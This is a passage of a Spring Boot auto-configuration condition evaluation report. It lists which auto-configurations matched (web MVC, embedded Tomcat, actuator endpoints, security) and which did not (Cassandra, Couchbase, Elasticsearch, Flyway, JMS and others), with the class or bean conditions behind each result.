   SecurityRequestMatchersManagementContextConfiguration.MvcRequestMatcherConfiguration#requestMatcherProvider matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - @ConditionalOnMissingBean (types: org.springframework.boot.autoconfigure.security.servlet.RequestMatcherProvider; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ServletEndpointManagementContextConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)

   ServletEndpointManagementContextConfiguration.WebMvcServletEndpointManagementContextConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)

   ServletManagementContextAutoConfiguration matched:
      - @ConditionalOnClass found required class 'javax.servlet.Servlet' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   ServletWebServerFactoryAutoConfiguration matched:
      - @ConditionalOnClass found required class 'javax.servlet.ServletRequest' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   ServletWebServerFactoryAutoConfiguration#tomcatServletWebServerFactoryCustomizer matched:
      - @ConditionalOnClass found required class 'org.apache.catalina.startup.Tomcat' (OnClassCondition)

   ServletWebServerFactoryConfiguration.EmbeddedTomcat matched:
      - @ConditionalOnClass found required classes 'javax.servlet.Servlet', 'org.apache.catalina.startup.Tomcat', 'org.apache.coyote.UpgradeProtocol' (OnClassCondition)
      - @ConditionalOnMissingBean (types: org.springframework.boot.web.servlet.server.ServletWebServerFactory; SearchStrategy: current) did not find any beans (OnBeanCondition)

   SimpleCacheConfiguration matched:
      - Cache org.springframework.boot.autoconfigure.cache.SimpleCacheConfiguration automatic cache type (CacheCondition)

   TaskSchedulingAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.scheduling.concurrent.ThreadPoolTaskScheduler' (OnClassCondition)

   TaskSchedulingAutoConfiguration#taskSchedulerBuilder matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.task.TaskSchedulerBuilder; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ThreadDumpEndpointAutoConfiguration matched:
      - @ConditionalOnEnabledEndpoint no property management.endpoint.threaddump.enabled found so using endpoint default (OnEnabledEndpointCondition)

   ThreadDumpEndpointAutoConfiguration#dumpEndpoint matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.management.ThreadDumpEndpoint; SearchStrategy: all) did not find any beans (OnBeanCondition)

   TomcatMetricsAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'io.micrometer.core.instrument.binder.tomcat.TomcatMetrics', 'org.apache.catalina.Manager' (OnClassCondition)
      - @ConditionalOnWebApplication (required) found 'session' scope (OnWebApplicationCondition)

   TransactionAutoConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.transaction.PlatformTransactionManager' (OnClassCondition)

   TransactionAutoConfiguration#platformTransactionManagerCustomizers matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.autoconfigure.transaction.TransactionManagerCustomizers; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ValidationAutoConfiguration matched:
      - @ConditionalOnClass found required class 'javax.validation.executable.ExecutableValidator' (OnClassCondition)
      - @ConditionalOnResource found location classpath:META-INF/services/javax.validation.spi.ValidationProvider (OnResourceCondition)

   ValidationAutoConfiguration#defaultValidator matched:
      - @ConditionalOnMissingBean (types: javax.validation.Validator; SearchStrategy: all) did not find any beans (OnBeanCondition)

   ValidationAutoConfiguration#methodValidationPostProcessor matched:
      - @ConditionalOnMissingBean (types: org.springframework.validation.beanvalidation.MethodValidationPostProcessor; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebEndpointAutoConfiguration matched:
      - @ConditionalOnWebApplication (required) found 'session' scope (OnWebApplicationCondition)

   WebEndpointAutoConfiguration#controllerEndpointDiscoverer matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.annotation.ControllerEndpointsSupplier; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebEndpointAutoConfiguration#endpointMediaTypes matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.EndpointMediaTypes; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebEndpointAutoConfiguration#pathMappedEndpoints matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.PathMappedEndpoints; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebEndpointAutoConfiguration#webEndpointDiscoverer matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.WebEndpointsSupplier; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebEndpointAutoConfiguration.WebEndpointServletConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)

   WebEndpointAutoConfiguration.WebEndpointServletConfiguration#servletEndpointDiscoverer matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.annotation.ServletEndpointsSupplier; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'javax.servlet.Servlet', 'org.springframework.web.servlet.DispatcherServlet', 'org.springframework.web.servlet.config.annotation.WebMvcConfigurer' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnMissingBean (types: org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration#formContentFilter matched:
      - @ConditionalOnProperty (spring.mvc.formcontent.filter.enabled) matched (OnPropertyCondition)
      - @ConditionalOnMissingBean (types: org.springframework.web.filter.FormContentFilter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration#hiddenHttpMethodFilter matched:
      - @ConditionalOnProperty (spring.mvc.hiddenmethod.filter.enabled) matched (OnPropertyCondition)
      - @ConditionalOnMissingBean (types: org.springframework.web.filter.HiddenHttpMethodFilter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#defaultViewResolver matched:
      - @ConditionalOnMissingBean (types: org.springframework.web.servlet.view.InternalResourceViewResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#requestContextFilter matched:
      - @ConditionalOnMissingBean (types: org.springframework.web.context.request.RequestContextListener,org.springframework.web.filter.RequestContextFilter; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter#viewResolver matched:
      - @ConditionalOnBean (types: org.springframework.web.servlet.ViewResolver; SearchStrategy: all) found beans 'defaultViewResolver', 'beanNameViewResolver', 'mvcViewResolver'; @ConditionalOnMissingBean (names: viewResolver; types: org.springframework.web.servlet.view.ContentNegotiatingViewResolver; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter.FaviconConfiguration matched:
      - @ConditionalOnProperty (spring.mvc.favicon.enabled) matched (OnPropertyCondition)

   WebMvcEndpointManagementContextConfiguration matched:
      - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnBean (types: org.springframework.web.servlet.DispatcherServlet,org.springframework.boot.actuate.endpoint.web.WebEndpointsSupplier; SearchStrategy: all) found beans 'webEndpointDiscoverer', 'dispatcherServlet' (OnBeanCondition)

   WebMvcEndpointManagementContextConfiguration#controllerEndpointHandlerMapping matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.servlet.ControllerEndpointHandlerMapping; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebMvcEndpointManagementContextConfiguration#webEndpointServletHandlerMapping matched:
      - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebSecurityEnablerConfiguration matched:
      - found 'session' scope (OnWebApplicationCondition)
      - @ConditionalOnBean (types: org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; SearchStrategy: all) found bean 'org.springframework.boot.actuate.autoconfigure.security.servlet.ManagementWebSecurityConfigurerAdapter'; @ConditionalOnMissingBean (names: springSecurityFilterChain; SearchStrategy: all) did not find any beans (OnBeanCondition)

   WebSocketServletAutoConfiguration matched:
      - @ConditionalOnClass found required classes 'javax.servlet.Servlet', 'javax.websocket.server.ServerContainer' (OnClassCondition)
      - found 'session' scope (OnWebApplicationCondition)

   WebSocketServletAutoConfiguration.TomcatWebSocketConfiguration matched:
      - @ConditionalOnClass found required classes 'org.apache.catalina.startup.Tomcat', 'org.apache.tomcat.websocket.server.WsSci' (OnClassCondition)

   WebSocketServletAutoConfiguration.TomcatWebSocketConfiguration#websocketServletWebServerCustomizer matched:
      - @ConditionalOnMissingBean (names: websocketServletWebServerCustomizer; SearchStrategy: all) did not find any beans (OnBeanCondition)


Negative matches:
-----------------

   ActiveMQAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.jms.ConnectionFactory' (OnClassCondition)

   AopAutoConfiguration.JdkDynamicAutoProxyConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.aop.proxy-target-class=false) did not find property 'proxy-target-class' (OnPropertyCondition)

   AppOpticsMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.appoptics.AppOpticsMeterRegistry' (OnClassCondition)

   ArtemisAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.jms.ConnectionFactory' (OnClassCondition)

   AtlasMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.atlas.AtlasMeterRegistry' (OnClassCondition)

   AtomikosJtaConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.atomikos.icatch.jta.UserTransactionManager' (OnClassCondition)

   BatchAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.batch.core.launch.JobLauncher' (OnClassCondition)

   BitronixJtaConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'bitronix.tm.jndi.BitronixContext' (OnClassCondition)

   CacheAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.cache.interceptor.CacheAspectSupport; SearchStrategy: all) did not find any beans of type org.springframework.cache.interceptor.CacheAspectSupport (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.cache.CacheManager' (OnClassCondition)

   CacheAutoConfiguration.CacheManagerJpaDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean' (OnClassCondition)

   CacheMeterBinderProvidersConfiguration.EhCache2CacheMeterBinderProviderConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'net.sf.ehcache.Ehcache' (OnClassCondition)

   CacheMeterBinderProvidersConfiguration.HazelcastCacheMeterBinderProviderConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'com.hazelcast.spring.cache.HazelcastCache', 'com.hazelcast.core.Hazelcast' (OnClassCondition)

   CacheMeterBinderProvidersConfiguration.JCacheCacheMeterBinderProviderConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.cache.CacheManager' (OnClassCondition)

   CacheMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.cache.CacheManager; SearchStrategy: all) did not find any beans of type org.springframework.cache.CacheManager (OnBeanCondition)

   CassandraAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Cluster' (OnClassCondition)

   CassandraDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Cluster' (OnClassCondition)

   CassandraHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Cluster' (OnClassCondition)

   CassandraReactiveDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Cluster' (OnClassCondition)

   CassandraReactiveHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Cluster' (OnClassCondition)

   CassandraReactiveRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.cassandra.ReactiveSession' (OnClassCondition)

   CassandraRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.datastax.driver.core.Session' (OnClassCondition)

   ClientHttpConnectorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.function.client.WebClient' (OnClassCondition)

   CloudFoundryActuatorAutoConfiguration:
      Did not match:
         - @ConditionalOnCloudPlatform did not find CLOUD_FOUNDRY (OnCloudPlatformCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet' (OnClassCondition)
         - found 'session' scope (OnWebApplicationCondition)
         - @ConditionalOnProperty (management.cloudfoundry.enabled) matched (OnPropertyCondition)

   CloudServiceConnectorsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.cloud.config.java.CloudScanConfiguration' (OnClassCondition)

   CompositeMeterRegistryConfiguration:
      Did not match:
         - NoneNestedConditions 1 matched 1 did not; NestedCondition on CompositeMeterRegistryConfiguration.MultipleNonPrimaryMeterRegistriesCondition.SingleInjectableMeterRegistry @ConditionalOnSingleCandidate (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans; NestedCondition on CompositeMeterRegistryConfiguration.MultipleNonPrimaryMeterRegistriesCondition.NoMeterRegistryCondition @ConditionalOnMissingBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans (CompositeMeterRegistryConfiguration.MultipleNonPrimaryMeterRegistriesCondition)

   CouchbaseAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Cluster' (OnClassCondition)

   CouchbaseCacheConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'com.couchbase.client.java.Bucket', 'com.couchbase.client.spring.cache.CouchbaseCacheManager' (OnClassCondition)

   CouchbaseDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Bucket' (OnClassCondition)

   CouchbaseHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Cluster' (OnClassCondition)

   CouchbaseReactiveDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Bucket' (OnClassCondition)

   CouchbaseReactiveHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Cluster' (OnClassCondition)

   CouchbaseReactiveRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Bucket' (OnClassCondition)

   CouchbaseRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.couchbase.client.java.Bucket' (OnClassCondition)

   DataSourceHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: javax.sql.DataSource; SearchStrategy: all) did not find any beans of type javax.sql.DataSource (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'org.springframework.jdbc.core.JdbcTemplate', 'org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource' (OnClassCondition)
         - @ConditionalOnEnabledHealthIndicator management.health.defaults.enabled is considered true (OnEnabledHealthIndicatorCondition)

   DataSourcePoolMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: javax.sql.DataSource,io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type javax.sql.DataSource, io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'javax.sql.DataSource', 'io.micrometer.core.instrument.MeterRegistry' (OnClassCondition)

   DataSourcePoolMetricsAutoConfiguration.HikariDataSourceMetricsConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.actuate.autoconfigure.metrics.jdbc.DataSourcePoolMetricsAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'com.zaxxer.hikari.HikariDataSource' (OnClassCondition)

   DatadogMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.datadog.DatadogMeterRegistry' (OnClassCondition)

   DispatcherServletAutoConfiguration.DispatcherServletConfiguration#multipartResolver:
      Did not match:
         - @ConditionalOnBean (types: org.springframework.web.multipart.MultipartResolver; SearchStrategy: all) did not find any beans of type org.springframework.web.multipart.MultipartResolver (OnBeanCondition)

   DynatraceMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.dynatrace.DynatraceMeterRegistry' (OnClassCondition)

   EhCacheCacheConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'net.sf.ehcache.Cache' (OnClassCondition)

   ElasticMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.elastic.ElasticMeterRegistry' (OnClassCondition)

   ElasticSearchClientHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.Client' (OnClassCondition)

   ElasticSearchJestHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.searchbox.client.JestClient' (OnClassCondition)

   ElasticSearchRestHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.RestClient' (OnClassCondition)

   ElasticsearchAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.Client' (OnClassCondition)

   ElasticsearchDataAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.Client' (OnClassCondition)

   ElasticsearchRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.elasticsearch.client.Client' (OnClassCondition)

   EmbeddedLdapAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.unboundid.ldap.listener.InMemoryDirectoryServer' (OnClassCondition)

   EmbeddedMongoAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.mongodb.MongoClient' (OnClassCondition)

   EmbeddedWebServerFactoryCustomizerAutoConfiguration.JettyWebServerFactoryCustomizerConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'org.eclipse.jetty.server.Server', 'org.eclipse.jetty.util.Loader', 'org.eclipse.jetty.webapp.WebAppContext' (OnClassCondition)

   EmbeddedWebServerFactoryCustomizerAutoConfiguration.NettyWebServerFactoryCustomizerConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'reactor.netty.http.server.HttpServer' (OnClassCondition)

   EmbeddedWebServerFactoryCustomizerAutoConfiguration.UndertowWebServerFactoryCustomizerConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'io.undertow.Undertow', 'org.xnio.SslClientAuthMode' (OnClassCondition)

   ErrorWebFluxAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.config.WebFluxConfigurer' (OnClassCondition)

   FlywayAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: javax.sql.DataSource; SearchStrategy: all) did not find any beans of type javax.sql.DataSource (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.flywaydb.core.Flyway' (OnClassCondition)
         - @ConditionalOnProperty (spring.flyway.enabled) matched (OnPropertyCondition)

   FlywayAutoConfiguration.FlywayConfiguration.FlywayInitializerJdbcOperationsDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.jdbc.core.JdbcOperations' (OnClassCondition)

   FlywayAutoConfiguration.FlywayConfiguration.FlywayInitializerJpaDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean' (OnClassCondition)

   FlywayAutoConfiguration.FlywayConfiguration.FlywayInitializerNamedParameterJdbcOperationsDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.jdbc.core.namedparam.NamedParameterJdbcOperations' (OnClassCondition)

   FlywayAutoConfiguration.FlywayJdbcOperationsDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.jdbc.core.JdbcOperations' (OnClassCondition)

   FlywayAutoConfiguration.FlywayJpaDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean' (OnClassCondition)

   FlywayAutoConfiguration.FlywayNamedParameterJdbcOperationsDependencyConfiguration:
      Did not match:
         - Ancestor org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration did not match (ConditionEvaluationReport.AncestorsMatchedCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.jdbc.core.namedparam.NamedParameterJdbcOperations' (OnClassCondition)

   FlywayEndpointAutoConfiguration#flywayEndpoint:
      Did not match:
         - @ConditionalOnBean (types: org.flywaydb.core.Flyway; SearchStrategy: all) did not find any beans of type org.flywaydb.core.Flyway (OnBeanCondition)

   FreeMarkerAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'freemarker.template.Configuration' (OnClassCondition)

   GangliaMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.ganglia.GangliaMeterRegistry' (OnClassCondition)

   GraphiteMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.graphite.GraphiteMeterRegistry' (OnClassCondition)

   GroovyTemplateAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'groovy.text.markup.MarkupTemplateEngine' (OnClassCondition)

   GsonAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.google.gson.Gson' (OnClassCondition)

   GsonHttpMessageConvertersConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.google.gson.Gson' (OnClassCondition)

   H2ConsoleAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.h2.server.web.WebServlet' (OnClassCondition)

   HazelcastAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.hazelcast.core.HazelcastInstance' (OnClassCondition)

   HazelcastCacheConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'com.hazelcast.core.HazelcastInstance', 'com.hazelcast.spring.cache.HazelcastCacheManager' (OnClassCondition)

   HazelcastJpaDependencyAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.hazelcast.core.HazelcastInstance' (OnClassCondition)

   HealthEndpointWebExtensionConfiguration.ReactiveWebHealthConfiguration:
      Did not match:
         - did not find reactive web application classes (OnWebApplicationCondition)

   HealthIndicatorAutoConfiguration#applicationHealthIndicator:
      Did not match:
         - @ConditionalOnMissingBean (types: org.springframework.boot.actuate.health.HealthIndicator,org.springframework.boot.actuate.health.ReactiveHealthIndicator; SearchStrategy: all) found beans of type 'org.springframework.boot.actuate.health.HealthIndicator' diskSpaceHealthIndicator (OnBeanCondition)

   HibernateMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: javax.persistence.EntityManagerFactory,io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type javax.persistence.EntityManagerFactory, io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'javax.persistence.EntityManagerFactory', 'org.hibernate.SessionFactory', 'io.micrometer.core.instrument.MeterRegistry' (OnClassCondition)

   HttpClientMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnBean (types: io.micrometer.core.instrument.MeterRegistry; SearchStrategy: all) did not find any beans of type io.micrometer.core.instrument.MeterRegistry (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required class 'io.micrometer.core.instrument.MeterRegistry' (OnClassCondition)

   HttpHandlerAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.web.reactive.DispatcherHandler' (OnClassCondition)

   HttpTraceAutoConfiguration.ReactiveTraceFilterConfiguration:
      Did not match:
         - did not find reactive web application classes (OnWebApplicationCondition)

   HumioMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.humio.HumioMeterRegistry' (OnClassCondition)

   HypermediaAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.hateoas.Resource' (OnClassCondition)

   InfinispanCacheConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.infinispan.spring.provider.SpringEmbeddedCacheManager' (OnClassCondition)

   InfluxDbAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.influxdb.InfluxDB' (OnClassCondition)

   InfluxDbHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.influxdb.InfluxDB' (OnClassCondition)

   InfluxMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.influx.InfluxMeterRegistry' (OnClassCondition)

   InfoContributorAutoConfiguration#buildInfoContributor:
      Did not match:
         - @ConditionalOnSingleCandidate (types: org.springframework.boot.info.BuildProperties; SearchStrategy: all) did not find any beans (OnBeanCondition)
      Matched:
         - @ConditionalOnEnabledInfoContributor management.info.defaults.enabled is considered true (OnEnabledInfoContributorCondition)

   InfoContributorAutoConfiguration#gitInfoContributor:
      Did not match:
         - @ConditionalOnSingleCandidate (types: org.springframework.boot.info.GitProperties; SearchStrategy: all) did not find any beans (OnBeanCondition)
      Matched:
         - @ConditionalOnEnabledInfoContributor management.info.defaults.enabled is considered true (OnEnabledInfoContributorCondition)

   IntegrationGraphEndpointAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.integration.graph.IntegrationGraphServer' (OnClassCondition)

   JCacheCacheConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.cache.Caching' (OnClassCondition)

   JacksonAutoConfiguration.JodaDateTimeJacksonConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required classes 'org.joda.time.DateTime', 'com.fasterxml.jackson.datatype.joda.ser.DateTimeSerializer', 'com.fasterxml.jackson.datatype.joda.cfg.JacksonJodaDateFormat' (OnClassCondition)

   JacksonHttpMessageConvertersConfiguration.MappingJackson2XmlHttpMessageConverterConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'com.fasterxml.jackson.dataformat.xml.XmlMapper' (OnClassCondition)

   JdbcRepositoriesAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.springframework.data.jdbc.repository.config.JdbcConfiguration' (OnClassCondition)

   JdbcTemplateAutoConfiguration:
      Did not match:
         - @ConditionalOnSingleCandidate (types: javax.sql.DataSource; SearchStrategy: all) did not find any beans (OnBeanCondition)
      Matched:
         - @ConditionalOnClass found required classes 'javax.sql.DataSource', 'org.springframework.jdbc.core.JdbcTemplate' (OnClassCondition)

   JerseyAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.glassfish.jersey.server.spring.SpringComponentProvider' (OnClassCondition)

   JerseySameManagementContextConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.glassfish.jersey.server.ResourceConfig' (OnClassCondition)

   JerseyServerMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.jersey2.server.MetricsApplicationEventListener' (OnClassCondition)

   JerseyWebEndpointManagementContextConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.glassfish.jersey.server.ResourceConfig' (OnClassCondition)

   JestAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.searchbox.client.JestClient' (OnClassCondition)

   JettyMetricsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'org.eclipse.jetty.server.Server' (OnClassCondition)

   JmsAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.jms.Message' (OnClassCondition)

   JmsHealthIndicatorAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'javax.jms.ConnectionFactory' (OnClassCondition)

   JmxAutoConfiguration:
      Did not match:
         - @ConditionalOnProperty (spring.jmx.enabled=true) found different value in property 'enabled' (OnPropertyCondition)
      Matched:
         - @ConditionalOnClass found required class 'org.springframework.jmx.export.MBeanExporter' (OnClassCondition)

   JmxEndpointAutoConfiguration#jmxMBeanExporter:
      Did not match:
         - @ConditionalOnSingleCandidate (types: javax.management.MBeanServer; SearchStrategy: all) did not find any beans (OnBeanCondition)

   JmxMetricsExportAutoConfiguration:
      Did not match:
         - @ConditionalOnClass did not find required class 'io.micrometer.jmx.JmxMeterRegistry' (OnClassCondition)

